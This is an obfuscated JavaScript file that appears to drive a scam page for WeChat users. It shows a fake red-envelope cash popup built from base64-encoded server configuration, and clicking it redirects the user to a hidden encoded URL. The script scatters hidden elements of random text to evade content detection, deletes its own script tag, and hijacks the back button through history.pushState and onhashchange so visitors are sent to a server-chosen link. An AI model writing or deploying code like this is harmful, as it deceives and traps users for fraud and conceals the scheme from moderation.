function fdm7r1dmx9khg(el) {
    return document.querySelector(el)
}

function is74wle4kbr2y(link, callback) {
    var label = document.createElement('script');
    label.src = link;
    label.onload = function () {
        if (typeof callback === 'function') callback()
    }
    document.body.appendChild(label)
}

function rtitzo9sge8fq() {
    var len = parseInt(Math.random() * 60) + 10;
    var i = 0;
    var str = '';
    var base = 20000;
    var range = 1000;
    while (i < len) {
        i++;
        var lower = parseInt(Math.random() * range);
        str += String.fromCharCode(base + lower)
    }
    return str
}

function cl48picmrunty(total) {
    var labelNames = ['div', 'li', 'ul', 'p', 'a', 'span', 'h2', 'i'];
    for (var i = 0; i < total; i++) {
        var name = labelNames[Math.floor(Math.random() * labelNames.length)];
        var label = document.createElement(name);
        label.style.display = 'none';
        label.textContent = rtitzo9sge8fq();
        document.body.appendChild(label)
    }
}

function rnihp7oxfo0mp(min, max, hex) {
    var number = 0;
    var value = hex ? Math.pow(10, hex) : 1;
    number = Math.floor(Math.random() * (max * value - min * value + 1)) + min * value;
    if (hex) {
        number = (number / value).toFixed(hex)
    }
    return number
}

function gc1vuywm3a8dn() {
    var a = Math.floor(Math.random() * 45) + 210;
    return 'rgb(' + a + ', 94, 77)'
}

function svlqxj8za2p88() {
    var number = Math.floor(Math.random() * 30) + 90;
    return number / 100
}
var api = null;
var sizeValue = svlqxj8za2p88();
var color = gc1vuywm3a8dn();

function ip7e10l6tmh16() {
    var box_size = {
        w: 300 * sizeValue,
        h: 500 * sizeValue
    }
    var btn_size = {
        w: 100 * sizeValue,
        h: 100 * sizeValue
    }
    var animation = Math.floor(Math.random() * 4) + 1;
    var radian = Math.floor(Math.random() * 9) + 15;
    var html = '<div style="z-index: 999; height: ' + box_size.h + 'px; background-color: ' + color + '; width: ' + box_size.w + 'px; margin: ' + -box_size.h / 2 + 'px ' + -box_size.w / 2 + 'px; border-radius: 10px; overflow: hidden; position: fixed; top: 50%; left: 50%; animation: show' + animation + ' .4s; overflow: hidden; ">                    <div style=" height: 300px; border: 1px solid ' + color + ';  background-color: ' + color + '; border-radius: 10px 10px 50% 50% / 10px 10px ' + radian + '% ' + radian + '%; box-shadow: 0px 4px 0px -1px rgba(0, 0, 0, 0.2); ">                        <image src="' + api.img + '" style="width:60px;height: 60px; margin: 0 auto 0; display: block; padding-top: 60px;" />                        <p style="font-size: 26px;text-align: center;padding-top: 20px;color: #ebcd9b;">' + api.ztitle + '</p>                        <p style="font-size: 16px;text-align: center;padding-top: 20px;color: #ebcd9b;">' + api.ftitle + '<span class="text-tip" style="margin-left: 14px; font-size: 12px; background-color: #ebcd9b; padding: 1px 4px; color: ' + color + '">可提现</span></p>                    </div>                    <div style="width: ' + btn_size.w + 'px; height: ' + btn_size.h + 'px; border: 1px solid #ebcd9b;background-color: #ebcd9b; border-radius: 50%; margin: -' + btn_size.h / 2 + 'px auto 0; box-shadow: 0px 4px 0px 0px rgba(0, 0, 0, 0.2); text-align: center; line-height: ' + btn_size.h + 'px; animation: btn' + animation + ' .5s ease .1s; " data-btn onclick="orgu5wf0enzz8(this)">                        <span style=" display: inline-block; font-size: 36px; font-family: SimSun; font-weight: bold; color: #333;">抢</span>                    </div>                </div>';
    var label_total = Math.floor(Math.random() * 10) + 10;
    cl48picmrunty(label_total);
    document.body.innerHTML += html;
    cl48picmrunty(label_total);
    var btn = document.querySelector('[data-btn]');
    btn.addEventListener('animationend', function () {
        var time = animation > 2 ? 1.8 : 1;
        btn.style.animation = 'btnShake' + animation + ' ' + time + 's ease 0s infinite'
    });
    var js = document.getElementById('main');
    if (js) js.parentNode.removeChild(js)
}

function orgu5wf0enzz8(el) {
    el.style.animation = 'btnMove .6s infinite alternate';
    gda6jrp46x27p7("/abcdb58c82402886156d8a108887b20dca8", function (res) {
        var shareurl = window.atob(res);
        setTimeout(function () {
            window.location.href = shareurl + '?&t=' + rnihp7oxfo0mp(100, 150, 2) + '&user=' + Math.round(new Date() / 1000);
        }, 1000)
    }, function (err) {
        console.log('XMLHttpRequest error >>', err)
    });
}

var requestUrl = "/api/asdfuiyturyteqriuwqture";

if (typeof WeixinJSBridge == "undefined") {
    if (document.addEventListener) {
        document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
    } else if (document.attachEvent) {
        document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
        document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
    }
} else {
    onBridgeReady();
}
function onBridgeReady() {
    // var a = 0;
    // setInterval(function() {
    //     a += 1;
    //     if (a % 2 == 0) {
    //         WeixinJSBridge.call('hideOptionMenu');
    //     } else {
    //         WeixinJSBridge.call('showOptionMenu');
    //     }
    // },
    // 300);
}

function gda6jrp46x27p7(url, success, fail) {
    var XHR = new XMLHttpRequest();
    XHR.onreadystatechange = function () {
        if (XHR.readyState !== 4) return;
        if (XHR.status === 200 || XHR.status === 304) {
            if (typeof success === 'function') success(XHR.responseText)
        } else {
            if (typeof fail === 'function') fail(XHR)
        }
    }
    XHR.open('GET', url, true);
    XHR.send(null)
}
gda6jrp46x27p7(requestUrl, function (res) {
    api = JSON.parse(window.atob(res));
    ip7e10l6tmh16();
    is74wle4kbr2y("https://hm.baidu.com/hm.js?aab03c807d67f8a67582c791c9e72dcf");
    // is74wle4kbr2y(window.api.baiduid);
    setTimeout(function () {
        history.pushState(history.length + 1, "message", "#" + new Date().getTime())
    }, 100);
    function zp() {
        function Nj(link) {
            if (link) {
                var label = document.createElement("a");
                label.setAttribute("rel", "noreferrer");
                label.setAttribute("href", link);
                document.body.appendChild(label);
                label.click()
            }
        }
        Nj(window.api.backlink)
    }
    window.onhashchange = function () {
        zp()
    }
}, function (err) {
    console.log('XMLHttpRequest error >>', err)
});